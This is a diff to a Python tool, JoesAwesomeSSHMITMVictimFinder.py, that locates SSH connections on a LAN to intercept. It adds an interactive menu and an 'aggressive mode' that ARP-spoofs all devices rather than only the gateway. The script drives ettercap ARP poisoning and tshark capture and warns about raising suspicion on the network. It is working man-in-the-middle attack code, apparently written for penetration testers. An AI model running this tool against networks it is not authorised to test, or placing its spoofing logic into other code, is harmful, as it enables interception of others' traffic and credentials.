@@ -1,7 +1,7 @@
 #!/usr/bin/python3
 #
 # JoesAwesomeSSHMITMVictimFinder.py
-# Copyright (C) 2017  Joe Testa <jtesta@positronsecurity.com>
+# Copyright (C) 2017-2018  Joe Testa <jtesta@positronsecurity.com>
 #
 # This program is free software: you can redistribute it and/or modify
 # it under the terms version 3 of the GNU General Public License as
@@ -29,7 +29,7 @@
 #
 
 # Built-in modules.
-import argparse, importlib, ipaddress, os, signal, subprocess, sys, tempfile
+import argparse, importlib, ipaddress, os, signal, subprocess, sys, tempfile, threading
 from time import sleep
 
 # Python3 is required.
@@ -56,7 +56,10 @@ except ImportError as e:
 ettercap_proc = None
 tshark_proc = None
 forwarding_was_off = None
+menu_thread = None
+main_thread_continue = True
 
+aggressive_mode = False
 verbose = False
 debug = False
 
@@ -85,10 +88,13 @@ def p(msg=''):
 # Captures control-C interruptions and gracefully terminates tshark and
 # ettercap.
 def signal_handler(signum, frame):
-    global ettercap_proc, tshark_proc, forwarding_was_off
+    global ettercap_proc, tshark_proc, forwarding_was_off, menu_thread
 
     d('Signal handler called.')
     p("\nShutting down ettercap and tshark gracefully.  Please wait...")
+
+    if menu_thread is not None:
+        menu_thread.stop()
 
     # tshark can just be terminated.
     if tshark_proc is not None:
@@ -160,6 +166,16 @@ def signal_handler(signum, frame):
 
 
     # Print all the IPs found.
+    print_discovered()
+
+    if menu_thread is not None:
+        d("Waiting for menu thread to terminate...")
+        menu_thread.join()
+
+    exit(0)
+
+
+def print_discovered():
     p()
     if len(total_local_clients) > 0:
         p("\nTotal local clients:")
@@ -175,7 +191,61 @@ def signal_handler(signum, frame):
             p('  * %s -> %s:22' % (tup[1], tup[0]))
         p()
 
-    exit(0)
+
+# This is the thread that reads user input while the program is running.
+class MenuHandler(threading.Thread):
+
+    def __init__(self):
+        threading.Thread.__init__(self, name="MenuHandler")
+        self.stop_requested = False
+
+    def run(self):
+        global debug, verbose, aggressive_mode, total_local_clients, total_local_servers, main_thread_continue
+
+        while not self.stop_requested:
+            try:
+                c = input()[0:1].lower()
+            except ValueError as e:
+                self.stop_requested = True
+                continue
+
+            if c == 'h':
+                print_menu()
+            elif c == 'a':  # Toggle aggressive mode.
+                if aggressive_mode is False:
+                    aggressive_mode = True
+                    p('Enabled aggressive mode')
+                else:
+                    aggressive_mode = False
+                    p('Disabled aggressive mode')
+            elif c == 'q':  # Graceful quit.
+                self.stop()
+                main_thread_continue = False  # Tell main thread to quit.
+                p("\nQuitting after current block is complete.  Please wait...")
+            elif c == 'd':  # Toggle debugging mode.
+                if debug is False:
+                    debug = True
+                    verbose = True
+                    p("Enabled debugging mode.")
+                else:
+                    debug = False
+                    verbose = False
+                    p("\nDisabled debugging mode.")
+            elif c == 'v':  # Toggle verbose mode.
+                debug = False
+                if verbose is False:
+                    verbose = True
+                    p("Enabled verbose mode.")
+                else:
+                    p("\nDisabled verbose mode.")
+            elif c == 'p':  # Print status.
+                print_discovered()
+
+        d("Menu thread exiting.")
+
+
+    def stop(self):
+        self.stop_requested = True
 
 
 # Ensure that nmap, ettercap, and tshark are all installed, and we are running
@@ -305,6 +375,19 @@ def get_lan_devices(network, gateway, ignore_list):
     return ret
 
 
+def print_menu():
+    p('Interactive menu keys:')
+    p()
+    p("  [a] toggle aggressive mode (spoofs all destination devices, not just\n      gateway)")
+    p("  [d] toggle debugging mode (highest verbosity)")
+    p("  [v] toggle verbose mode (moderate verbosity)")
+    p("  [p] print status")
+    p()
+    p("  [h] prints this menu")
+    p("  [q] quits program gracefully")
+    p()
+
+
 # Splits a list of devices into blocks of size "block_size".
 def blocketize_devices(devices, block_size):
     device_blocks = []
@@ -337,8 +420,16 @@ def arp_spoof_and_monitor(interface, local_addresses, gateway, device_block, lis
     d('Running tshark: %s' % ' '.join(tshark_args))
     tshark_proc = subprocess.Popen(tshark_args, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)
 
+    # By default, the first target group is the gateway.  This means only
+    # connections going outside the LAN will be discovered.  If aggressive
+    # mode is enabled, then all local and remote connections will be
+    # found.
+    target1 = gateway
+    if aggressive_mode:
+        target1 = ''
+
     # ARP spoof the block of devices and gateway.
-    ettercap_args = ['ettercap', '-i', interface, '-T', '-M', 'arp', '/%s//' % gateway, '/%s//' % ','.join(device_block)]
+    ettercap_args = ['ettercap', '-i', interface, '-T', '-M', 'arp', '/%s//' % target1, '/%s//' % ','.join(device_block)]
     d('Running ettercap: %s' % ' '.join(ettercap_args))
     ettercap_proc = subprocess.Popen(ettercap_args, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
 
@@ -528,13 +619,17 @@ if __name__ == '__main__':
     if block_size >= 10:
         p("WARNING: setting the block size too high will cause strain on your network interface.  Eventually, your interface will start dropping frames, causing a network denial-of-service and greatly raising suspicion.  However, raising the block size is safe on low-utilization networks.  You better know what you're doing!\n")
 
+    print_menu()
+    menu_thread = MenuHandler()
+    menu_thread.start()
+
     # Enable the signal handlers so that ettercap and tshark gracefully shut
     # down on CTRL-C.
     signal.signal(signal.SIGINT, signal_handler)
     signal.signal(signal.SIGTERM, signal_handler)
 
     forwarding_was_off = enable_ip_forwarding(True)
-    while True:
+    while main_thread_continue:
 
         v('Discovering devices on LAN via ARP ping...')
         devices = get_lan_devices(net_cidr, gateway, ignore_list)
@@ -551,9 +646,14 @@ if __name__ == '__main__':
         if one_pass:
             break
 
+    menu_thread.stop()
+    menu_thread.join()
+
     # If IP forwarding was off before we started, turn it off now.
     if forwarding_was_off:
         enable_ip_forwarding(False)
 
-    p('Single pass complete.')
+    if one_pass:
+        p('Single pass complete.')
+
     exit(0)
